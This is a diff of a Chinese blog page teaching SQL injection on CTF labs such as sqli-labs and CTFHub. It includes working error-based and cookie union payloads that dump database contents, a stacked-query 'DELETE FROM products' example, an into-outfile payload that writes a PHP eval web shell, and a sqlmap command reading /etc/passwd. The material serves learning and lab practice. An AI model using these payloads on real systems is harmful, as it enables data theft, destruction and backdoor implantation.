+<span class="token comment" spellcheck="true">--level 3 --risk 1 --thread 10</span>
+<span class="token string">''</span>'
+<span class="token comment" spellcheck="true">--threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10</span>
+<span class="token comment" spellcheck="true">--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5</span>
+<span class="token comment" spellcheck="true">--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</span>
+<span class="token comment" spellcheck="true">--search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样</span>
+<span class="token string">''</span>'
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="五、报错注入"><a href="#五、报错注入" class="headerlink" title="五、报错注入"></a>五、报错注入</h2><h3 id="floor报错注入-双查询注入"><a href="#floor报错注入-双查询注入" class="headerlink" title="floor报错注入/双查询注入"></a>floor报错注入/双查询注入</h3><blockquote>
-<p>双查询报错/floor报错注入是由于<code>rand()</code>，<code>count()</code>，<code>group by</code> ，<code>floor</code>四个语句联合使用造成的，缺一不可。</p>
+<h2 id="五、报错注入"><a href="#五、报错注入" class="headerlink" title="五、报错注入"></a>五、报错注入</h2><h3 id="floor报错注入-x2F-双查询注入"><a href="#floor报错注入-x2F-双查询注入" class="headerlink" title="floor报错注入&#x2F;双查询注入"></a>floor报错注入&#x2F;双查询注入</h3><blockquote>
+<p>双查询报错&#x2F;floor报错注入是由于<code>rand()</code>，<code>count()</code>，<code>group by</code> ，<code>floor</code>四个语句联合使用造成的，缺一不可。</p>
 </blockquote>
-<p>一些研究人员发现，使用<code>group by</code>子句结合<code>rand()</code>函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询/floor报错注入。使用<code>floor()</code>函数只是为了将查询结果分类</p>
+<p>一些研究人员发现，使用<code>group by</code>子句结合<code>rand()</code>函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询&#x2F;floor报错注入。使用<code>floor()</code>函数只是为了将查询结果分类</p>
 <p>需用到四个函数和一个<code>group by</code>语句：</p>
 <ol>
-<li><code>group by ...</code> —-&gt;分组语句 //将查询的结果分类汇总</li>
-<li><code>rand()</code> —-&gt;随机数生成函数</li>
-<li><code>floor()</code> —-&gt;取整函数 //用来对生成的随机数取整</li>
-<li><code>concat()</code>、 <code>concat_ws()</code>—-&gt;连接字符串</li>
-<li><code>count()</code> —-&gt;统计函数 //结合group by语句统计分组后的数据</li>
+<li><code>group by ...</code> —&gt;分组语句 &#x2F;&#x2F;将查询的结果分类汇总</li>
+<li><code>rand()</code> —&gt;随机数生成函数</li>
+<li><code>floor()</code> —&gt;取整函数 &#x2F;&#x2F;用来对生成的随机数取整</li>
+<li><code>concat()</code>、 <code>concat_ws()</code>—&gt;连接字符串</li>
+<li><code>count()</code> —&gt;统计函数 &#x2F;&#x2F;结合group by语句统计分组后的数据</li>
 </ol>
 <p>还需要了解哈<code>子查询</code>：</p>
 <p>子查询又称为内部查询，子查询允许把一个查询嵌套在另一个查询当中，简单的来说就是一个select中又嵌套了一个select，嵌套的这个select语句就是一个子查询。</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">select concat("-",(select database()));
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><strong>双查询/floor报错注入公式：</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">#获取数据库名
-?id=-1' union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+
+<p><strong>双查询&#x2F;floor报错注入公式：</strong></p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#获取数据库名</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
 或者
-?id=1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select 1 from (select count(*),concat('</span><span class="token operator">~</span><span class="token string">',database(),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
 
-#获取表名
-?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+
+<span class="token comment" spellcheck="true">#获取表名</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
 或者
-?id=1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and (select 1 from (select count(*),concat('</span><span class="token operator">~</span><span class="token string">',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'</span><span class="token operator">~</span>'<span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>使用如上SQL语句，发现多查询几次会爆出<code>Duplicate entry</code>的错误，并且将我们需要的信息都爆出来了。</p>
 <p><strong>实例：</strong></p>
@@ -1768,7 +1765,6 @@ Table: ctf4
 <h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><blockquote>
 <p><code>updatexml(xml_target, XPath_string, new_value)</code>：返回替换的XML片段</p>
 </blockquote>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1776,8 +1772,7 @@ Table: ctf4
 <th>描述</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>XML_document</td>
 <td>String格式，需要操作的xml片段</td>
 </tr>
@@ -1789,20 +1784,17 @@ Table: ctf4
 <td>new_value</td>
 <td>String格式，更新后的内容</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <p><strong>Payload:</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">updatexml(1,concat(0x7e,(select database()),0x7e),1);
+<pre class="line-numbers language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200726170613.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200726170613.png"></p>
 <p>如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
 <p><code>concat()</code>函数是将其连成一个字符串，因此不会符合<strong>XPATH_string</strong>的格式，从而出现格式错误，爆出数据库</p>
 <p><code>0x7e</code>为hex码,实为<code>~</code>,为了使Xpath格式语法书写错误</p>
 <h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><blockquote>
 <p><code>extractvalue(xml_frag, xpath_expr)</code>：使用XPath表示法从XML字符串中提取值</p>
 </blockquote>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1810,8 +1802,7 @@ Table: ctf4
 <th>描述</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>xml_frag</td>
 <td>目标xml文档</td>
 </tr>
@@ -1819,13 +1810,11 @@ Table: ctf4
 <td>xpath_expr</td>
 <td>Xpath格式的字符串，xml路径</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <p><strong>Payload:</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">extractvalue(1,concat(0x7e,(select database()),0x7e));
+<pre class="line-numbers language-sql"><code class="language-sql">extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200726170721.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200726170721.png"></p>
 <p>如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
 <h2 id="六、二次注入"><a href="#六、二次注入" class="headerlink" title="六、二次注入"></a>六、二次注入</h2><p>待更。。。</p>
 <h2 id="七、堆叠注入"><a href="#七、堆叠注入" class="headerlink" title="七、堆叠注入"></a>七、堆叠注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在SQL中，分号（;）是用来表示一条SQL语句的结束。试想一下我们在分号（;）结束后一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。<br>用户输入：<code>1; DELETE FROM products</code><br>服务器端生成的sql语句为：<code>select * from products where productid=1;DELETE FROM products</code><br>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
@@ -1839,34 +1828,34 @@ Table: ctf4
 <p><strong>Cookie注入方法：</strong></p>
 <p><strong>方法一：</strong>BurpSuite抓包修改Cookie进行注入</p>
 <p><strong>方法二：</strong>使用SqlMap进行注入</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u "http://xxx.com" --cookie "id=x" --dbs --level 2
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://xxx.com"</span> --cookie <span class="token string">"id=x"</span> --dbs --level 2 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p><strong>题目来源：CTFHub-Web技能树-Cookie注入</strong></p>
 <p>题目已经很明显提示是cookie注入，打开Burpsuite抓包</p>
 <p>抓包之后可以看到cookie里面有id参数，我们尝试进行注入，果然可以成功注入</p>
-<p><img src="https://img.jwt1399.top//img/20200719102419.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200719102419.png"></p>
 <p>后续就是修改Cookie进行普通的数字型注入就可以了</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">#确定字段数【字段数为2】
-Cookie: id=1 order by 1
-Cookie: id=1 order by 2
-Cookie: id=1 order by 3
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
+Cookie: id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
 
-#确定字段顺序
-Cookie: id=-1 union select 1,2
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
 
-#爆数据库名【sqli】
-Cookie: id=-1 union select 1,database()
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-#爆表名【news,ztikrnhkas】
-Cookie: id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
+<span class="token comment" spellcheck="true">#爆表名【news,ztikrnhkas】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
 
-#爆列名【rcdrtihzyr】
-Cookie: id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='ztikrnhkas'
+<span class="token comment" spellcheck="true">#爆列名【rcdrtihzyr】</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'ztikrnhkas'</span>
 
-#爆值
-Cookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas
+<span class="token comment" spellcheck="true">#爆值</span>
+Cookie: id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>rcdrtihzyr <span class="token keyword">from</span> ztikrnhkas
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200719103005.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200719103005.png"></p>
 <h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>待更。。。</p>
 <h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><p>待更。。。</p>
 <h2 id="九、读写文件"><a href="#九、读写文件" class="headerlink" title="九、读写文件"></a>九、读写文件</h2><h4 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h4><p><code>load_file（file_name）</code>：读取文件并返回该文件内容作为一个字符串。</p>
@@ -1875,11 +1864,10 @@ Cookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas
 <li>必须有权限读取并且文件必须完全可读</li>
 <li>必须指定文件完整路径</li>
 <li>能够使用union查询（sql注入时）</li>
-<li>对Web目录有写权限用户必须有secure_file_priv=文件权限</li>
+<li>对Web目录有写权限用户必须有secure_file_priv&#x3D;文件权限</li>
 <li>欲读取文件必须小于max_allowed_packetde的允许值</li>
 </ul>
 <p><strong>secure_file_priv的值</strong></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1887,26 +1875,23 @@ Cookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas
 <th>含义</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td>secure_file_prive=null</td>
-<td>限制mysql不允许导入/导出</td>
+<tbody><tr>
+<td>secure_file_prive&#x3D;null</td>
+<td>限制mysql不允许导入&#x2F;导出</td>
 </tr>
 <tr>
-<td>secure_file_priv=/tmp/</td>
-<td>限制mysql的导入/导出只能发生在/tmp/目录下</td>
+<td>secure_file_priv&#x3D;&#x2F;tmp&#x2F;</td>
+<td>限制mysql的导入&#x2F;导出只能发生在&#x2F;tmp&#x2F;目录下</td>
 </tr>
 <tr>
-<td>secure_file_priv=空</td>
-<td>不限制mysql的导入/导出</td>
+<td>secure_file_priv&#x3D;空</td>
+<td>不限制mysql的导入&#x2F;导出</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <p>mysql下执行<code>show global variables like &#39;%secure%&#39;;</code>可以查看<code>secure_file_priv</code>的值</p>
 <h4 id="写文件函数"><a href="#写文件函数" class="headerlink" title="写文件函数"></a>写文件函数</h4><p><code>into outfile</code></p>
 <h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><p>靶机：sqli-labs第7关</p>
-<pre class="line-numbers language-lang-mysql"><code class="language-lang-mysql">#查看页面变化，判断sql注入类别
+<pre class="line-numbers language-mysql"><code class="language-mysql">#查看页面变化，判断sql注入类别
 ?id=1 and 1=1 
 ?id=1 and 1=2
 #You are in.... Use outfile......
@@ -1921,8 +1906,8 @@ Cookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas
 
 ?id=-1')) union select 1,('<?php @eval($_POST["pass"])?>'),3  into outfile "/var/www/html/a.php"--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="sqlmap读取文件"><a href="#sqlmap读取文件" class="headerlink" title="sqlmap读取文件"></a>sqlmap读取文件</h3><p>—file-read用法用于读取本地文件</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python sqlmap.py -u "http://xxx/x?id=1" --file-read=/etc/passwd
+<h3 id="sqlmap读取文件"><a href="#sqlmap读取文件" class="headerlink" title="sqlmap读取文件"></a>sqlmap读取文件</h3><p>–file-read用法用于读取本地文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://xxx/x?id=1"</span> --file-read<span class="token operator">=</span>/etc/passwd
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="十、SQL注入靶场"><a href="#十、SQL注入靶场" class="headerlink" title="十、SQL注入靶场"></a>十、SQL注入靶场</h2><p>以下链接均为我其他文章的SQL注入靶场的学习记录</p>
 <p><strong>SQLi-LABS</strong></p>
@@ -2714,7 +2699,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">712.3k</span>&nbsp;字
+                class="white-color">1051.4k</span>&nbsp;字
             
             
             
@@ -2945,22 +2930,6 @@ $(function () {
     
 
         
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
 </body>
 
 </html>
